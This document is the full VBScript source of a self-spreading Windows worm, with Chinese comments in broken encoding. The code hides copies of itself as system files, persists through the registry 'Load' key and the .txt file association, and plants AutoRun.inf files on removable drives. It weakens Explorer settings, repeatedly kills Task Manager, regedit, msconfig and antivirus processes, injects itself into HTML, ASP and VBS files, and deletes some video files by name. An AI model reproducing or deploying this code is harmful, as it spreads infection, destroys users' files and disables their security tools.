'$Top_3

Dim Cnt, CntMax, Maxsize, Path_V1, Path_V2, Name_V1, Version

Cnt = 0
CntMax = 150'��Ⱦ�ļ��������Ŀ
Maxsize = 150000
Name_V1 = "{HCQ9D-TVCWX-X9QRG-J4B2Y-GR2TT-CM3HY-26VYW-6JRYC-X66GX-JVY2D}.vbs"
Path_V1 = GetSFolder(1) & Name_V1 '0:Windows 1:System  2:Temp
Path_V2 = GetSFolder(0) & Name_V1
Version = "3" '�汾��



Call Main()

'���ܣ������� 

Sub Main()
    On Error Resume Next
    If IsVbs() = true Then
        Call ExeVbs() 'ִ��VBS�ļ�״̬ʱ�ĳ���
    ElseIf IsHtml() = true Then
        Call ExeWebPage() 'ִ��WEBҳ״̬ʱ�ĳ���
    End If
End Sub


'����:�����ļ���WEBҳ״̬ʱ��ִ�еĳ��� 

Sub ExeWebPage()
    On Error Resume Next
    Dim objfso, vbsCode

    Set objfso = CreateObject("Scripting.FileSystemObject")
    vbsCode = GetScriptCode("vbscript") '�õ�VBScript�ű�����

    Call DeSafeSet() '����ϵͳ��ȫ������

    Call InvadeSystem(objfso, vbsCode)

    Set objfso = Nothing
End Sub


'���ܣ�����ϵͳ��ȫ������ 
'˵����1.Ϊ����������Զ����Ź��� 2.�����ܱ����Ĳ���ϵͳ�ļ� 3.�ر������ļ�ѡ��

Sub DeSafeSet()
    Dim HLMShow , HCUAdvanced
    Dim HCUExplorer
    HLMShow = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL\Checkedvalue"
    HCUAdvanced = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\ShowSuperHidden"
    HCUExplorer = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDriveTypeAutoRun"
    Call WriteReg (HCUExplorer, 129, "REG_DWORD") '����Զ����Ź���
    Call WriteReg (HCUAdvanced, 0, "REG_DWORD") '�����ܱ����Ĳ���ϵͳ�ļ�
    Call WriteReg (HLMShow, 0, "REG_DWORD") '�ر������ļ�ѡ��
End Sub


'�����ļ�����Ϊ����ϵͳ�ļ�
'������f(fso����) pathf(�ļ�����·��)

Sub SetFileAttr(f, pathf)
    Dim vf
    Set vf = f.GetFile(pathf)
    vf.Attributes = 6
End Sub


'����:��ָ�����뿽����ָ���ļ� 
'������f(fso����),code(����) pathf(�ļ�����·��)

Sub CopyFile(f, code, pathf)
    On Error Resume Next
    Dim vf
    Set vf = f.OpenTextFile(pathf, 2, true)
    vf.Write code
End Sub


'����:�õ���ͬ�ű����ԵĴ���
'��ע����Ľ�

Function GetScriptCode(Languages)
    On Error Resume Next
    Dim soj
    For Each soj In document.Scripts
        If LCase(soj.Language) = Languages Then
            Select Case LCase(soj.Language)
                Case "vbscript"
                    GetScriptCode = soj.Text
                    Exit Function
                Case "javascript"
                    GetScriptCode = soj.Text
                    Exit Function
            End Select

        End If
    Next
End Function



'����:�����ļ���VBS�ļ�״̬ʱ��ִ�еĳ��� 

Sub ExeVbs()
    On Error Resume Next
    Dim objfso, objshell, FullPath_Self, Name_Self, vbsCode
    Dim ArgNum, Para_V, oArgs, SubPara_V, RunPath
    Dim FullPath_OK

    FullPath_OK = GetSFolder(0) & "OK.ini"

    Set objfso = CreateObject("Scripting.FileSystemObject")
    Set objshell = CreateObject("wscript.shell")

    Call InitializeVBS(objfso, objshell) '��ʼ��


    Name_Self = WScript.ScriptName '�õ��ļ���
    FullPath_Self = WScript.ScriptFullName '�õ��ļ���������·��


    If Name_Self = Name_V1 Then

        Set oArgs = WScript.Arguments '��ýű�������
        ArgNum = 0
        Do While ArgNum < oArgs.Count
            Para_V = Para_V & " " & oArgs(ArgNum)
            ArgNum = ArgNum + 1
        Loop

        SubPara_V = LCase(Right(Para_V, 3))

        Select Case SubPara_V
            Case "run"

                'msgbox "'AutoRun����"
                RunPath = Left(FullPath_Self, 2)
                Call Run(RunPath) '��������

                vbsCode = GetSelfCode(objfso, FullPath_Self) '���ȫ�ֱ���vbsCode �õ�����������
                Call InvadeSystem(objfso, vbsCode) '�������ļ��ļ��
                Call Run(Path_V1)


            Case "txt"
                'msgbox "'TxT��������"
                RunPath = "%SystemRoot%\system32\NOTEPAD.EXE " & Para_V
                Call Run(RunPath) '��TXT�ļ�

                vbsCode = GetSelfCode(objfso, FullPath_Self)
                Call InvadeSystem(objfso, vbsCode)
                Call Run(Path_V1)

            Case Else
                'msgbox "'��������"
                If PreInstance = True Then '���ʵ���������о��˳�
                    WScript.Quit
                End If

                vbsCode = GetSelfCode(objfso, FullPath_Self)
                Call InvadeSystem(objfso, vbsCode)

                If objfso.FileExists(FullPath_OK) = False Or IsOK(objfso, Date(), FullPath_OK) = False Then
                    Call DeSafeSet() '����ϵͳ��ȫ������
                    Call SearchDrives(objfso, vbsCode) '�������������� 
                    Call OK(objfso, Date(), FullPath_OK)
                End If

                Call Monitor(objfso, vbsCode) 'ѭ������
        End Select


    Else

        'msgbox "'��������"
        vbsCode = GetSelfCode(objfso, FullPath_Self) '���ȫ�ֱ���vbsCode �õ�����������
        Call InvadeSystem(objfso, vbsCode) '�������ļ��ļ��
        Call Run(Path_V1)

    End If

    Set objfso = Nothing
    Set objshell = Nothing

End Sub


'����: VBS�ļ�������ʼ��
'����: f(fso����) shell(shell����)

Sub InitializeVBS(f, Shell)
    On Error Resume Next
    Dim T
    '��ʱ���ã���ֹ������ʱ��ɵĳ�����ֹ
    T = Shell.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout")
    If (T>= 1) Then
        Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout", 0, "REG_DWORD"
    End If

End Sub




'���ܣ��ж�����ʵ���Ƿ�������
'����ֵ��True(����)  False(��������) 

Function PreInstance()
    On Error Resume Next
    Dim num_cnt
    num_cnt = 0
    PreInstance = False
    strComputer = "."
    Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
    Set colProcessList = objWMIService.ExecQuery("Select * from Win32_Process Where " & "Name = 'cscript.exe' or Name = 'wscript.exe'")
    For Each objProcess in colProcessList
        If InStr(CStr(objProcess.CommandLine), WScript.ScriptFullName)>0 Then
            num_cnt = num_cnt + 1
        End If
    Next
    If num_cnt>= 2 Then
        PreInstance = True
    End If
End Function

'���ܣ��жϵ�ǰ�������Ƿ��Ѹ�Ⱦ�ɹ�
'������fso,Now_V ,path_f
'����ֵ��True(����)  False(��������)

Function IsOK(fso, Now_V, path_f)
    Dim vf
    IsOK = False
    Set vf = fso.OpenTextFile(path_f, 1)
    If vf.ReadLine = "OK" And InStr(vf.ReadLine , Now_V) >0 Then
        IsOK = True
    ElseIf InStr(vf.ReadLine, "Admin") >0 Then
        MsgBox "You are Admin!!!"
        IsOK = True
    End If
End Function


'���ܣ���ǵ�ǰ�������Ѹ�Ⱦ�ɹ�
'������fso,Now_V ,path_f

Sub OK(fso, Now_V, path_f)
    Dim vf
    Set vf = fso.OpenTextFile(path_f, 2, True)
    vf.Write "OK" & VBCRLF
    vf.WriteLine Now_V
    Call SetFileAttr(fso, path_f)
End Sub

'����:����ϵͳ

Sub Monitor(objfso, vbsCode)
    On Error Resume Next
    Dim dc, d
    ProcessNames = Array("360tray.exe", "taskmgr.exe", "regedit.exe", "msconfig.exe", "SREng.exe", "USBAntiVir.exe")
    Do
        Call KillProcess(ProcessNames)
        Call InvadeSystem(objfso, vbsCode)

        Set dc = objfso.Drives '����������autorun.inf
        For Each d In dc

            If d.DriveType = 1 Then
                Call AutoRun(objfso, d.DriveLetter, vbsCode)
            End If

        Next

        WScript.sleep 10000
    Loop

End Sub




'���ܣ�����AutoRun,inf�ļ�
'������f(fso����) D(��������) vbsCode(�����������)]

Sub AutoRun(f, D, vbsCode)
    On Error Resume Next
    Dim path_autorun, path_vbs, inf_autorun
    path_autorun = D & ":\AutoRun.inf" 'AutoRun.inf����·��
    path_vbs = D & ":\" & Name_V1

    If f.FileExists(path_vbs) = false Or f.FileExists(path_autorun) = False Then '�жϲ����ļ��Ƿ����


        If f.FileExists(path_autorun) = true Then
            f.DeleteFile path_autorun, True
        End If

        If f.FileExists(path_vbs) = true Then
            f.DeleteFile path_vbs, True
        End If

        Call CopyFile(f, vbsCode, path_vbs) '��������
        Call SetFileAttr(f, path_vbs) '�����ļ�����Ϊ����ϵͳ�ļ�

        inf_autorun = "[AutoRun]" & VBCRLF & "shell\AutoRun=��(A)" & VBCRLF & "shell\AutoRun\command=WScript.exe " & Name_V1 & " ""AutoRun"""
        Call CopyFile(f, inf_autorun, path_autorun)
        Call SetFileAttr(f, path_autorun)

    End If
End Sub


'���ܣ��ж��Ƿ���VBSִ��״̬
'����ֵ��True  False

Function IsVbs()
    On Error Resume Next
    Dim TErr
    TErr = WScript.ScriptFullName '�õ������ļ������·��
    If Err Then
        Err.Clear
        IsVbs = false
    Else
        IsVbs = true
    End If
End Function


'���ܣ��ж��Ƿ���Htmlִ��״̬
'����ֵ��True  False

Function IsHtml()
    On Error Resume Next
    Dim TErr
    TErr = document.Location '�õ������ļ������·��
    If Err Then
        Err.Clear
        IsHtml = false
    Else
        IsHtml = true
    End If
End Function


'���ܣ��ж�������汾
'������f(fso) path_v(���жϵ�����������·��)
'����ֵ���汾��

Function GetVersion(f, path_v)
    Dim buffer , FV , n
    Set FV = f.OpenTextFile(path_v, 1)
    buffer = FV.ReadAll()
    n = InStr(buffer, "'$Top")
    GetVersion = Mid(buffer, n + 6, 1)
End Function


'���ܣ�����ϵͳ 
'������f vbsCode

Sub InvadeSystem(f, vbsCode)
    On Error Resume Next
    Dim Value, dc, d, HCULoad

    HCULoad = "HKEY_CURRENT_USER\SoftWare\Microsoft\Windows NT\CurrentVersion\Windows\Load"

    'ɾ���Ͱ汾���ļ�
    If f.FileExists(Path_V1) = True Then
        If GetVersion(f, Path_V1)<Version Then
            f.DeleteFile Path_V1 , True
        End If
    End If

    '��������
    If f.FileExists(Path_V1) = false Then
        Call CopyFile(f, vbsCode, Path_V1)
        Call SetFileAttr(f, Path_V1)
    End If

    '���������
    If ReadReg(HCULoad)<> Path_V1 Then
        Call WriteReg (HCULoad, Path_V1, "")
    End If

    '��������TxT����
    If f.FileExists(Path_V2) = false Then
        Call CopyFile(f, vbsCode, Path_V2)
        Call SetFileAttr(f, Path_V2)
    End If


    '�����ļ�����
    Value = "%SystemRoot%\System32\WScript.exe " & """" & Path_V2 & """" & " %1 %* "
    If ReadReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\txtfile\shell\open\command\")<>Value Then
        Call SetTxtFileAss(Path_V2)
    End If

    '��������� TxT����
    If ReadReg(HCULoad)<> Path_V1 And ReadReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\txtfile\shell\open\command\")<>Value Then
        Set dc = f.Drives '����������autorun.inf
        For Each d In dc
            Call AutoRun(f, d.DriveLetter, vbsCode)
        Next
    End If

End Sub


'���ܣ������ļ�����
'�������������������·��(sFilePath)

Sub SetTxtFileAss(sFilePath)
    On Error Resume Next
    Dim Value
    Value = "%SystemRoot%\System32\WScript.exe " & """" & sFilePath & """" & " %1 %* "
    Call WriteReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\txtfile\shell\open\command\", Value, "REG_EXPAND_SZ")
End Sub




'���ܣ�������������� 
'������f(fso����) FullPath_Self

Function GetSelfCode(f, FullPath_Self)
    On Error Resume Next
    Dim n, n1, buffer, Self
    Set Self = f.OpenTextFile(FullPath_Self, 1)
    buffer = Self.ReadAll
    n = InStr(buffer, "'$Top")
    n1 = InstrRev(buffer, "'$Bottom")
    buffer = Mid(buffer, n, n1 - n + 8)
    GetSelfCode = buffer
    Self.Close
End Function



'���ܣ���������������(1:���ƶ�ý�������� ,2:�̶�������,3:����������)
'������f(fso����)  vbsCode
'��ע��ֻ��������������������C��

Sub SearchDrives(f, vbsCode)
    On Error Resume Next
    Dim d , dc
    Set dc = f.Drives
    For Each d In dc
        If Cnt >= CntMax Then '��Ⱦ�ļ�������
            Exit For
        End If
        If (d.DriveType = 1 Or d.DriveType = 2 Or d.DriveType = 3) And d.DriveLetter <> "C" Then
            If d.DriveType = 1 Then
                Call SearchFile(f, d.Path & "\", vbsCode)
            End If
        End If
    Next

End Sub



'���ܣ������ɴ�Ⱦ�ļ��Ĺ�����ɾ����������Ƶ
'������f(fso����) strPath(�ļ��л�������������·��) vbsCode

Sub SearchFile(f, strPath, vbsCode)
    On Error Resume Next
    Dim pfo, pf, pfi, ext
    Dim psfo, ps
    '���������ļ�
    Set pfo = f.GetFolder(strPath)
    Set pf = pfo.Files
    For Each pfi In pf
        If Cnt >= CntMax Then '��Ⱦ�ļ�������
            Exit For
        End If
        ext = LCase(f.GetExtensionName(pfi.Path))



        Select Case ext '����ļ�����չ���Ƿ�Ϊ htm��html��asp��vbs
			Case "htm" , "html", "asp", "vbs"

	            Call InfectHead(pfi.Path, pfi, f, vbsCode, ext)

			Case "mpg", "rmvb", "avi", "rm" 

	            If IsSexFile(pfi.Name) = True Then '�ж��ļ��Ƿ��ǲ�������Ƶ
	                pfi.Delete
	            End If

        End Select
    Next

    '���������ļ���
    Set psfo = pfo.SubFolders
    For Each ps In psfo
        If Cnt >= CntMax Then '��Ⱦ�ļ�������
            Exit For
        End If
        Call SearchFile(f, ps.Path, vbsCode) '�ݹ����
    Next
End Sub


'����:ͨ���ļ����ж��ļ��Ƿ��ǲ�������Ƶ
'����:fname(�ļ���)
'����ֵ:true(������) false(����) 

Function IsSexFile(fname)
    IsSexFile = false
    If InStr(fname, "����")>0 Or InStr(fname, "��")>0 Or InStr(fname, "͵��")>0 Or _
                InStr(fname, "͵��")>0 Or InStr(fname, "�ڽ�")>0 Or InStr(fname, "ǿ��")>0 Or _
                InStr(fname, "�ּ�")>0 Or InStr(fname, "����Ƭ")>0 Or InStr(fname, "����")>0 Then
        IsSexFile = true
    End If
End Function


'����:�ж��ļ��Ƿ��ѱ���Ⱦ
'����:buffer(�ļ�ȫ������) ftype(�ļ�����)
'����ֵ:true(�ѱ���Ⱦ) false(δ����Ⱦ)

Function Isinfected(buffer, ftype)
    Isinfected = true
    Select Case ftype
Case "htm" , "html" , "asp", "vbs":
        If InStr(buffer, "'$Top") = 0 Then
            Isinfected = false
        End If
        Case Else
            Isinfected = true
    End Select
End Function


'���ܣ���Ⱦ�ļ�,��������뵽�ļ�ͷ��ֻ��ȾС��Maxsize���ļ�
'������strPath(�ļ�����·��) fi(�ļ�����)  f(fso����) strCode(����Ĵ���) ftype(�ļ�����)

Sub InfectHead(strPath, fi, f, vbsCode, ftype)
    On Error Resume Next
    Dim tso, buffer, strCode
    If fi.Size< Maxsize Then 'ֻ��ȾС��100KB���ļ�
        Set tso = f.OpenTextFile(strPath, 1, true)
        buffer = tso.ReadAll()
        tso.Close
        Select Case ftype
Case "htm" , "html" , "asp":
            If Isinfected(buffer, ftype) = false Then '�ж��Ƿ��ѱ���Ⱦ
                strCode = MakeScript(vbsCode, 0) '������ҳ�ű�
                Set tso = f.OpenTextFile(strPath, 2, true)
                Cnt = Cnt + 1
                tso.Write strCode & VBCRLF & buffer '���뵽�ļ�ͷ
                tso.Close
                Set tso = Nothing
            End If
Case "vbs":
            If Isinfected(buffer, ftype) = false Then '�ж��Ƿ��ѱ���Ⱦ
                n = InStr(buffer , "Option Explicit") 'ȥ��Option Explicit��Ӱ�� ��ΪOption Explicit���֮ǰ���ܷ����κδ���
                If n<>0 Then
                    buffer = Replace(buffer, "Option Explicit", "", 1, 1, 1)
                    Set tso = f.OpenTextFile(strPath, 2, true)
                    tso.Write vbsCode & VBCRLF & buffer '���뵽�ļ�ͷ
                    Cnt = Cnt + 1
                    tso.Close
                    Set tso = Nothing
                Else
                    Set tso = f.OpenTextFile(strPath, 2, true)
                    tso.Write vbsCode & VBCRLF & buffer '���뵽�ļ�ͷ
                    Cnt = Cnt + 1
                    tso.Close
                    Set tso = Nothing
                End If
            End If
            Case Else
        End Select
    End If

End Sub



'���ܣ��õ�ϵͳ·��
'������f(fso����)  p(���� 0: Windows �ļ��� 1: System �ļ���  2: Temp �ļ��� )
'����ֵ��GetSF��ϵͳ·���ļ���·����

Function GetSF(f, p)
    On Error Resume Next
    GetSF = f.GetSpecialFolder(p) & "\"
End Function




'���ܣ� �õ�ϵͳ·�� 
'������ p(���� 0: Windows �ļ��� 1: System �ļ���  2: Temp �ļ��� )
'����ֵ��GetSFolder��ϵͳ·���ļ���·����

Function GetSFolder(p)
    On Error Resume Next
    Dim f
    Set f = CreateObject("Scripting.FileSystemObject")
    GetSFolder = f.GetSpecialFolder(p) & "\"
    Set f = Nothing
End Function



'���ܣ����ܲ�������ҳ�ű�
'������strCode(vbs�ű�)  T(1:����   0 :������)
'����ֵ:MakeScript��vbs��ҳ�ű���
'��ע�����ܹ��ܻ��д�����

Function MakeScript(strCode, T)
    If T = 1 Then
        MakeScript = EnCode(strCode)
    Else
        MakeScript = "<" & "SCRIPT Language = VBScript>" & VBCRLF & strCode & VBCRLF & "</" & "SCRIPT>"
    End If

End Function


'���ܣ�����ָ�����̼���
'������ProcessNames(���̼���)

Sub KillProcess(ProcessNames)
    On Error Resume Next
    Set objWMIService = GetObject("winmgmts:{impersonationLevel=Impersonate}!root\cimv2")
    For Each ProcessName in ProcessNames
        Set colProcessList = objWMIService.execquery(" Select * From win32_process where name = '" & ProcessName & "' ")
        For Each objProcess in colProcessList
            objProcess.terminate()
        Next
    Next
End Sub

'���ܣ�ɾ��ע��� 
'������strkey(ע������������)

Sub DeleteReg(strkey)
    On Error Resume Next
    Set tmps = CreateObject("wscript.shell")
    tmps.RegDelete strkey
    Set tmps = Nothing
End Sub


'���ܣ���ȡע���
'������strkey(ע������������)
'����ֵ:ReadReg(ע�������)

Function ReadReg(strkey)
    On Error Resume Next
    Dim tmps
    Set tmps = CreateObject("wscript.shell")
    ReadReg = tmps.RegRead(strkey)
    Set tmps = Nothing
End Function


'���ܣ�д��ע���
'������strkey(ע������������)  value(ע�������) vtype(ֵ����)

Sub WriteReg(strkey, Value, vtype)
    On Error Resume Next
    Dim tmps
    Set tmps = CreateObject("wscript.shell")
    If vtype = "" Then
        tmps.RegWrite strkey, Value
    Else
        tmps.RegWrite strkey, Value, vtype
    End If
    Set tmps = Nothing
End Sub



'����:��������
'����:���������·��

Sub Run(ExeFullName)
    On Error Resume Next
    Dim WshShell
    Set WshShell = WScript.CreateObject("wscript.shell")
    WshShell.Run ExeFullName
    Set WshShell = Nothing
End Sub


'����:���������

Sub ReBoot()
    strComputer = "."
    Set objWMIService = GetObject("winmgmts:" & "{impersonationLevel=impersonate,(Shutdown)}!\\" & strComputer & "\root\cimv2")
    Set colOperatingSystems = objWMIService.ExecQuery ("Select * from Win32_OperatingSystem")
    For Each objOperatingSystem in colOperatingSystems
        ObjOperatingSystem.Reboot()
    Next
End Sub

'$Bottom 
